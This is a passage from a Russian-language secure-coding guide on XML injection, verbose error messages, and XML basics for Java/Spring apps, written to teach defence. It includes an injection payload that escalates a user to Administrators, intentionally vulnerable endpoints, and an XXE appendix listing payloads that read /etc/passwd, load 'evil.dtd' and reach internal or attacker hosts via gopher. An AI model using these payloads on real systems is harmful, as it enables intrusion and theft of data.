В зависимости от функции, в которой используется XML, можно вмешаться в логику приложения, выполнить несанкционированные
действия или получить доступ к конфиденциальным данным.

Чтобы продемонстрировать слабость «внедрение XML», мы будем использовать простое REST приложение, которое получает из
POST запроса введенные пользователем логин, пароль, email и сохраняет данные в файл. Каждому новому пользователю
автоматически назначается группа «Users». XML-файл с учетными данными пользователя имеет следующий вид:

XML-файл:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
    <user id="d2a68206-a2e9-4b4f-ae9b-f298b20d37f3">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>asd@asd.zxc</email>
    </user>
    <user id="ec77d4a3-156a-4464-bc9e-ed9835661b75">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>qwe@asd.zxc</email>
    </user>
</users>
```

К примеру, пользователь отправляет POST следующего вида:

![cwe-91_1.png](readme_img/cwe-91_1.png)

В XML файле создается новая запись:

```xml

<user id="43ba8dcf-bb04-4d69-95e6-0d231868b81b">
    <username>hacker</username><!--</username>
        <password>37a6259cc0c1dae299a7866489dff0bd</password>
        <group>Users</group>
        <email>-->
    <password>xxx</password>
    <group>Administrators</group>
    <email>fu@qwe.asd</email>
</user>
```

Таким образом, пользователь смог подменить данные (поле group), на которые, по идее, влиять не должен.

Потенциальное воздействие зависит от уязвимого приложения и его функциональности. Злоумышленник может получить доступ к
конфиденциальной информации, изменить или удалить данные и повысить привилегии в приложении. XML Injection может
использоваться в атаках XXE для получения доступа к внутренним сетям, сбора конфиденциальной информации, выполнения
сканирования портов и т.д. В худшем случае эта слабость может привести к полной компрометации системы.

### 10.2. Защитные меры

При разработке приложения необходимо обращать внимание на входные данные. Согласно спецификациям Консорциума Всемирной
паутины (W3C), существует 5 символов, которые не должны появляться в буквальном виде в документе XML, за исключением
случаев, когда они используются в качестве разделителей markup или в комментарии, инструкции по обработке или разделе
CDATA.

```
<!-- в комментариях --> ничего не должно быть экранировано, но никакие строки -- не допускаются.
<![CDATA[ внутри CDATA ]]> ничего не должно быть экранировано, но никакие строки ]]> не допускаются.
<?PITarget в пределах PIs ?> ничего не должно быть экранировано, но никакие строки ?> не допускаются.
```

Во всех остальных случаях эти символы должны быть заменены либо с помощью соответствующей сущности, либо с помощью
числовой ссылки в соответствии со следующей таблицей:

| Original Character | XML entity replacement | XML numeric replacement (Unicode) |
|:------------------:|:----------------------:|:---------------------------------:|
|         <          |          &lt;          |               &#60;               |
|         >	         |         &gt;	          |               &#62;               |
|         "	         |        &quot;	         |               &#34;               |
|         &	         |         &amp;	         |               &#38;               |
|         '	         |        &apos;	         |               &#39;               |

Некоторые XML-процессоры (например, XMLOutputFactory, DocumentBuilderFactory, javax.xml.bind.Marshaller) автоматически заменяют все специальные символы на символьные сущности. Пример сгенерированного при помощи javax.xml.bind.Marshaller XML документа:
```xml
<user id="2fb9e103-f8ab-4d2a-b0ac-18bc97f0610f">
    <username>hacker&lt;/username&gt;&lt;!--</username>
    <password>37a6259cc0c1dae299a7866489dff0bd</password>
    <group>Users</group>
    <email>--&gt;&lt;password&gt;xxx&lt;/password&gt;&lt;group&gt;Administrators&lt;/group&gt;&lt;email&gt;fu@qwe.asd</email>
</user>
```

Для предотвращения XML Injection:

1. Правильно проверяйте вводимые пользователем данные. Отклоняйте данные, фильтруйте и избегайте, когда это возможно. Убедитесь, что ввод, который будет подставлен в XML документ безопасен;
2. Не составляйте XML документ при помощи обычной конкатенации строк. Используйте безопасные XML-процессоры;
3. Применяйте белый список при ограниченном наборе возможных значений;
4. Реализуйте правильную обработку ошибок.

Правильная обработка ошибок помогает предотвратить использование злоумышленниками сообщений об ошибках для сбора информации о приложении или системе, на которой оно работает.

### 10.3. Примеры

Во всех примерах используется XML файл users.xml с данными пользователей:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
    <user id="d2a68206-a2e9-4b4f-ae9b-f298b20d37f3">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>asd@asd.zxc</email>
    </user>
    <user id="ec77d4a3-156a-4464-bc9e-ed9835661b75">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>qwe@asd.zxc</email>
    </user>
</users>
```

#### *Пример 1. Небезопасная запись в XML документ*
В данном примере введенные пользователем логин, пароль (его md5 hash) и email подставляются в XML строку с помощью конкатенации. Проверка введенных значений не выполняется. Это позволяет пользователю манипулировать структурой документа.
```java
/**
 * Injection:
 * {
 * "username": "hacker</username><!--",
 * "password": "null",
 * "email": "--><password>xxx</password><group>Administrators</group><email>fu@qwe.asd"
 * }
 */
@PostMapping(value = "add-user-unsafe"
        , consumes = MediaType.APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_XML_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void addUserUnsafe(@RequestBody LoginForm loginForm, HttpServletResponse response) throws IOException {
    String newUser = "\t<user id=\"" + UUID.randomUUID() + "\">\n" +
            "\t\t<username>" + loginForm.username() + "</username>\n" +
            "\t\t<password>" + DigestUtils.md5Hex(loginForm.password()) + "</password>\n" +
            "\t\t<group>Users</group>\n" +
            "\t\t<email>" + loginForm.email() + "</email>\n" +
            "\t</user>";

    Path usersPath = Path.of(XML_PATH);
    String users = String.join("\n", Files.readAllLines(usersPath));
    String newUsers = users.replace("</users>", newUser) + "\n</users>";
    Files.writeString(usersPath, newUsers);

    response.setContentType("text/xml");
    response.getWriter().write(newUser);
}
```

#### *Пример 2. Безопасное добавление пользователя в XML документ при помощи javax.xml.bind.Marshaller*
В данном примере из введенных пользователем данных создается объект User (pojo), добавляется в общий список Users, который затем сериализуется в XML и сохраняется в файл. Marshaller по умолчанию экранирует все спец. символы.
```java
@PostMapping(value = "add-user-safe",
        consumes = MediaType.APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_XML_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void addUserSafe(@RequestBody LoginForm loginForm, HttpServletResponse response) throws IOException, JAXBException {

    JAXBContext context = JAXBContext.newInstance(Users.class);
    Unmarshaller unmarshaller = context.createUnmarshaller();

    Users users = (Users) unmarshaller.unmarshal(new File(XML_PATH));

    User newUser = new User(loginForm.username(), DigestUtils.md5Hex(loginForm.password()), "Users"
            , UUID.randomUUID(), loginForm.email());

    users.addUser(newUser);

    Marshaller marshaller = context.createMarshaller();
    marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
    marshaller.marshal(users, new File(XML_PATH));

    response.setContentType("text/xml");
    marshaller.marshal(users, response.getOutputStream());
}
```

#### *Пример 3. Безопасное экранирование пользовательского ввода*
В данном примере все символы из введенного пользователем логина, пароля (его md5 hash) и email экранируются перед подстановкой в XML строку.
```java
@PostMapping(value = "add-user-safe-escape",
        consumes = MediaType.APPLICATION_JSON_VALUE, produces = MediaType.APPLICATION_XML_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void addUserSafeEscape(@RequestBody LoginForm loginForm, HttpServletResponse response) throws IOException {
    // Для экранирования спец символов используется org.apache.commons.text.StringEscapeUtils
    // Так же можно использовать org.springframework.web.util.HtmlUtils.htmlEscape()

    String newUser = "\t<user id=\"" + UUID.randomUUID() + "\">\n" +
            "\t\t<username>" + StringEscapeUtils.escapeXml11(loginForm.username()) + "</username>\n" +
            "\t\t<password>" + DigestUtils.md5Hex(loginForm.password()) + "</password>\n" +
            "\t\t<group>Users</group>\n" +
            "\t\t<email>" + StringEscapeUtils.escapeXml11(loginForm.email()) + "</email>\n" +
            "\t</user>";
    // Так же можно использовать org.springframework.web.util.HtmlUtils.htmlEscape()

    Path usersPath = Path.of(XML_PATH);
    String users = String.join("\n", Files.readAllLines(usersPath));
    String newUsers = users.replace("</users>", newUser) + "\n</users>";
    Files.writeString(usersPath, newUsers);

    response.setContentType("application/xml");
    response.getWriter().write(newUser);
}
```

### 10.4. Дополнительная литература
1. https://cwe.mitre.org/data/definitions/91.html
2. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection

***

## 11.	CWE-209: Generation of Error Message Containing Sensitive Information

### 11.1. Описание

Неправильная обработка ошибок может привести к различным проблемам безопасности веб-сайта. Наиболее распространенной проблемой является отображение пользователю (хакеру) подробных внутренних сообщений об ошибках, таких как трассировки стека, дампы баз данных и коды ошибок. Эти сообщения раскрывают детали реализации, которые никогда не должны раскрываться. Такие детали могут предоставить хакерам важные подсказки о потенциальных недостатках сайта, и такие сообщения также беспокоят обычных пользователей.

Веб-приложения часто генерируют состояния ошибок во время нормальной работы. Недостаток памяти, исключения нулевого указателя, сбой системного вызова, недоступность базы данных, тайм-аут сети и сотни других распространенных условий могут привести к возникновению ошибок. Эти ошибки должны обрабатываться в соответствии с хорошо продуманной схемой, которая предоставит пользователю осмысленное сообщение об ошибке, диагностическую информацию для обслуживающего персонала сайта и никакой полезной информации для злоумышленника.

Даже когда сообщения об ошибках не содержат много подробностей, несоответствия в таких сообщениях все равно могут раскрыть важные подсказки о том, как работает сайт, и какая информация находится под «капотом». Например, когда пользователь пытается получить доступ к файлу, который не существует, сообщение об ошибке обычно указывает «файл не найден». При доступе к файлу, на который пользователь не имеет прав, оно указывает «доступ запрещен». Пользователь не должен знать, что файл вообще существует, но такие несоответствия легко раскроют наличие или отсутствие недоступных файлов или структуру каталогов сайта.

### 11.2. Защитные меры

Несколько советов, которые помогут предотвратить генерацию сообщений об ошибках, содержащих конфиденциальную информацию, в ваших приложениях: 

Убедитесь, что приложения не раскрывают ошибки разработки. Обычно эти настройки находятся в конфигурационном файле используемого фреймворка. Например, для Spring Boot сообщение об ошибке и любые ошибки привязки больше не включаются в страницу ошибок по умолчанию. Это снижает риск утечки информации клиенту. server.error.include-message и server.error.include-binding-errors могут быть использованы для управления включением сообщения и ошибок привязки соответственно. Поддерживаемые значения: always, on-param и never.

Избегайте отображения подробных сообщений об ошибках пользователям или разработчикам

Внедрите надлежащие механизмы обработки ошибок, не раскрывающие конфиденциальную информацию. Вы можете записывать подробные журналы в файл журнала, но сохранить ошибку, отображаемую пользователю, в общем виде, например, так:
```java
try {
        // some code here
    } catch (error) {
        log_error(error_message);
  return "An error occurred.";
    }
```

### 11.3. Примеры

#### *Пример 1. Отсутствие обработки сообщений об ошибках*
В данном примере обработка исключений не осуществляется.
```java
@GetMapping("/sql")
public List<Product> findByName_HQL_unsafe() {
    String name = "q' or 1=1'";
    return repository.findByName_HQL_unsafe(name);
}
```

В настройках установлены два параметра, которые предоставляют клиенту подробную информацию об ошибке:
```properties
server.error.include-message=always
server.error.include-binding-errors=always
```

![cwe-209_1.png](readme_img/cwe-209_1.png)

#### *Пример 2. Небезопасная генерация сообщений об ошибках*
В данном примере производится обработка исключений, но в случае ошибки возвращается слишком подробная информация:
```java
@GetMapping("/check_product/{name}")
public String isProductExist(@PathVariable String name) {
    try {
        repository.findByName_HQL_unsafe(name);
        return "Found!";
    } catch (Exception e) {
        return "Товар не найден:" + e;
    }
}
```

![cwe-209_2.png](readme_img/cwe-209_2.png)

#### *Пример 2. Безопасная генерация сообщений об ошибках*
Клиенту возвращается заранее заданное сообщение об ошибке. Подробная информация записывается в лог приложения, доступ к которому имеет ограниченный список лиц.

```java
private static final Logger logger = LogManager.getLogger(ErrorMessageController.class);

@GetMapping("/check_product_safe/{name}")
public String isProductExistSafety(@PathVariable String name) {
    try {
        repository.findByName_HQL_unsafe(name);
        return "Found!";
    } catch (Exception e) {
        logger.error(e.getMessage());
        return "Товар не найден";
    }
}
```

![cwe-209_3.png](readme_img/cwe-209_3.png)

### 11.4. Дополнительная литература

1. https://cwe.mitre.org/data/definitions/209.html
2. https://learn.snyk.io/lesson/error-message-with-sensitive-information/
3. https://owasp.org/www-community/Improper_Error_Handling
4. https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.3-Release-Notes#changes-to-the-default-error-pages-content
5. https://dev.to/abdelrani/error-handling-in-spring-web-using-rfc-9457-specification-5dj1

***

## Приложение 1. Структура и возможности XML

* XML - аббревиатура от англ. eXtensible Markup Language (пер. расширяемый язык разметки).
* XML – язык разметки, который напоминает HTML.
* XML предназначен для передачи данных, а не для их отображения.
* Теги XML не предопределены. Вы должны сами определять нужные теги.

### 1.1. Разница между XML и HTML

XML не является заменой HTML. Они предназначены для решения разных задач: XML решает задачу хранения и транспортировки данных, фокусируясь на том, что такое эти самые данные, HTML же решает задачу отображения данных, фокусируясь на том, как эти данные выглядят. Таким образом, HTML заботится об отображении информации, а XML о транспортировке информации.

### 1.2. Структура XML

- В зависимости от уровня соответствия стандартам документ может быть "верно сформированным" ("well-formed") (может проверяется средой разработки), либо "валидным" ("valid") (проверяется в процессе обработки). Вот несколько основных правил создания верно сформированного документа:
- Каждый элемент XML должен содержать начальный и конечный тэг (либо пустой тэг типа <TAG />, который может нести информацию посредством своих атрибутов).
- Любой вложенный элемент должен быть полностью определён внутри элемента, в состав которого он входит.
- Документ должен иметь только один элемент верхнего уровня.
- Имена элементов чувствительны к регистру.
- Валидным (valid) называется корректно сформированный (well-formed) документ, отвечающий двум дополнительным требованиям:
- Пролог документа может содержать определение типа документа (DTD - Document Type Definition), задающее структуру документа.
- Оставшаяся часть документа должна отвечать структуре, заданной в DTD.

В XML мы можем определять схему элементов, использовать вложенные элементы данных, извлекать их с помощью синтаксического анализатора XML.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
        <!ELEMENT users (user)+>
        <!ELEMENT user (id,username,password)>
        <!ELEMENT id (#PCDATA)>
        <!ELEMENT username (#PCDATA)>
        <!ELEMENT password (#PCDATA)>
        ]>
<users>
    <user>
        <id>1</id>
        <username>Rahul</username>
        <password>$%@#!@%xzcv5354</password>
    </user>
    <user>
        <id>2</id>
        <username>Faraz</username>
        <password>j@ff@0ck$l</password>
    </user>
    <user>
        <id>3</id>
        <username>Armaan</username>
        <password>armaan</password>
    </user>
</users>
```

В приведенном выше XML есть описание DTD, в котором определен тип данных для XML. Полное DTD также может быть определено во внешнем файле. В DTD есть нечто под названием «ENTITIES», которое можно использовать для подстановки текста.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [
        <!ENTITY x "Volodya" >
        <!-- Here "x" is the entity name which is nothing but the substituion for the string "Volodya" -->
        ]>
<users>
    <user>
        <id>1</id>
        <username>&x;</username> <!-- here the entity "x" is a variable storing the value "Volodya"-->
        <password>!@#$%^&*()1234567890</password>
    </user>
</users>
```

ENTITIES могут использоваться для определения DTD во внешнем файле, который может быть относительным URL или внешним URL. Здесь на помощь приходит XXE (внешние сущности XML). Наличие внешнего DTD позволяет злоумышленнику сделать внешний запрос со стороны сервера, который выполняется с помощью ключевого слова «SYSTEM», за которым следует путь или URL-адрес внешнего файла DTD.

```xml
<!DOCTYPE users [
        <!ENTITY x SYSTEM "http://qweqweqwe/evil.dtd" >
        ]>
```

Эти объекты можно было использовать только внутри структуры XML. Однако есть нечто, называемое сущностями параметров, которые можно определять или вызывать внутри самого DOCTYPE. Они обозначаются символом `%`, за которым следует имя объекта.  
Источники внедрения XXE - файлы / источники ввода, которые злоумышленник может использовать для внедрения своего вредоносного XML.

* XML
* PPT(X)
* XLS(X)
* PDF
* ODT
* DOC(X)
* SSRF
* GPX
* SAML
* SVG
* JSON TO XML Modification
* Feed.RSS
* XSD (XML Schema Defination)
* XMP
* WAP
* XSLT

Поддерживаемые протоколы:
1. File: could be used to read local file on the server
`file:///etc/passwd`
2. HTTP(s): useful in OOB Data Exfiltration
`http(s)://securityidiots.com/lol.xml`
3. FTP: useful in OOB Data Exfiltration & hitting the internal FTP service which is behind NAT
`ftp://securityidiots.com/lol.xml`
4. SFTP: hitting the internal SFTP service which is behind NAT
`sftp://securityidiots.com:11111/`
5. TFTP: hitting the internal TFTP service which is behind NAT
`tftp://securityidiots.com:12346/lol.xml`
6. DICT : could also be used to make requests to internal services
`dict://ip:22/_XXX`
`dict://ip:6379/_XXX`
7. NETDOC: This could be used as an alternative to file in JAVA based Servers.
`netdoc:/etc/passwd`
8. LDAP: could be used to query internal LDAP Service.
`ldap://localhost:11211/%0astats%0aquit`
9. GOPHER:
`gopher://<host>:<port>/_<gopher-path>`
`gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)`
10. Making internal HTTP Requests(GET,POST..etc):
`gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A`
`gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body`
11. PHP: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.
`php://filter/convert.base64-encode/resource=index.php`
12. Data:
`data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk`

### 1.3. XML схема

В дополнение к данным, XML-системы обычно используют два дополнительных компонента: схемы и преобразования.  
Схема – это просто XML-файл, содержащий правила для содержимого XML-файла данных. Файлы схем обычно имеют расширение XSD.  
Схемы позволяют программам проверять данные. Они формируют структуру данных и обеспечивают их понятность создателю и другим людям. Например, если пользователь вводит недопустимые данные, например текст в поле даты, программа может предложить ему исправить их. Если данные в XML-файле соответствуют правилам в схеме, для их чтения, интерпретации и обработки можно использовать любую программу, поддерживающую XML. Например, javax.xml.validation.Validator может проверять данные <users.xml> на соответствие схеме users.xsd:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xs:schema attributeFormDefault="unqualified" elementFormDefault="qualified" xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="users">
    <xs:complexType>
      <xs:sequence>
        <xs:element maxOccurs="unbounded" name="user">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="username" type="xs:string" />
              <xs:element name="password" type="xs:string" />
              <xs:element name="group" type="xs:string" />
              <xs:element name="email" type="xs:string" />
            </xs:sequence>
            <xs:attribute name="id" type="xs:positiveInteger" use="required" />
          </xs:complexType>
        </xs:element>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema>
```

Обратите внимание на следующее:

Строковые элементы в приведенном примере схемы называются объявлениями.  
Объявления являются мощным средством управления структурой данных. Например, объявление `<xsd:sequence>` означает, что теги, такие как username, password, group и email должны следовать в указанном выше порядке. С помощью объявлений можно также проверять типы данных, вводимых пользователем. Например, приведенная выше схема требует ввода положительного целого числа для идентификатора пользователя.  
Если данные в XML-файле соответствуют правилам схемы, то такие данные называют допустимыми. Процесс контроля соответствия XML-файла данных правилам схемы называют (достаточно логично) проверкой. Большим преимуществом использования схем является возможность предотвратить с их помощью повреждение данных. Схемы также облегчают поиск поврежденных данных, поскольку при возникновении такой проблемы обработка XML-файла останавливается.  

### 1.4. Преобразования

XML также позволяет повторно использовать данные. Механизм повторного использования данных называется преобразованием XSLT (или просто преобразованием).  
Преобразования можно использовать для обмена данными между серверными системами, например между базами данных, или для представления данных в виде html. Так же используется для трансформации XML документов в другие форматы (например, для трансформации XML в HTML).  

### 1.5. Объектная модель  XML-документов (Document Object Model - DOM)

XML имеет древовидную структуру. В самостоятельном XML-документе всегда имеется один корневой элемент (инструкция <?xml version="1.0"?> к дереву элементов отношения не имеет), в котором допустим ряд вложенных элементов, некоторые из которых тоже могут содержать вложенные элементы. Так же могут встречаться текстовые узлы, комментарии и инструкции. Можно считать, что XML-элемент содержит массив вложенных в него элементов и массив атрибутов.  
У элементов дерева бывают элементы-предки и элементы-потомки (у корневого элемента предков нет, а у тупиковых элементов (листьев дерева) нет потомков). Каждый элемент дерева находится на определённом уровне вложенности (далее — «уровень»). Элементы упорядочены в порядке расположения в тексте XML, и поэтому можно говорить об их предыдущих и следующих элементах. Это очень похоже на организацию каталогов в файловой системе.  
Класс XML DOM является представлением XML-документа в памяти. Модель DOM позволяет читать, обрабатывать и изменять XML-документ программным образом.  
Это стандартизованный, структурированный способ представления XML-данных в памяти, хотя на самом деле данные XML хранятся в файлах и пересылаются из других объектов в строковом виде. Далее приведен пример XML-данных.

```xml
<?xml version="1.0"?>
<books>
    <book>
        <author>Carson</author>
        <price format="dollar">31.95</price>
        <pubdate>05/01/2001</pubdate>
    </book>
    <pubinfo>
        <publisher>MSPress</publisher>
        <state>WA</state>
    </pubinfo>
</books> 
```

При считывании в память создается следующая структура:

![p-1_1.png](readme_img/p-1_1.png)

Каждый круг на этой иллюстрации представляет собой узел в структуре XML-документа, называемый объектом XmlNode.

### 1.6. XPath

XPath – невероятно гибкий, мощный, и простой инструмент для навигации по документам XML. Используется для быстрого поиска запросов к элементам;  
Строка XPath описывает способ выбора нужных элементов (XmlNode) из массива элементов, которые могут содержать вложенные элементы. Начинается отбор с переданного множества элементов, на каждом шаге пути отбираются элементы, соответствующие выражению шага, и в результате оказывается отобрано подмножество элементов, соответствующих данному пути.  
Для примера возьмём следующий XHTML документ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="001">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>user@mail</email>
    </user>
    <user id="002">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>admin@mail</email>
    </user>
</users>
```

XPath-путь  `//users/user[username/text()=' admin' and password/text()='21232f297a57a5a743894a0e4a801fc3']` будет соответствовать элементу (пользователю) с ID=002.

### 1.7. XQuery

XQuery – язык запросов и функциональный язык программирования, разработанный для обработки данных в формате XML, простого текста, JSON или других предметно-специфичных форматах. XQuery использует XML как свою модель данных. Предназначен для запроса и преобразования коллекций структурированных и неструктурированных данных.  
Несколько примеров, где используется XQuery:
1. Выборка информации из баз данных с помощью веб-сервисов
2. Формирование отчётов на основе данных в XML базах данных
3. Поиск информации в текстовых документах
4. Выборка и преобразование данных XML в XHTML формат для публикации в вебе
5. Сбор данных из нескольких баз данных для интеграционных приложений
6. Разделение документа XML на несколько частей для выполнения отдельных множественных операций.



***
© Barkhatov Anton





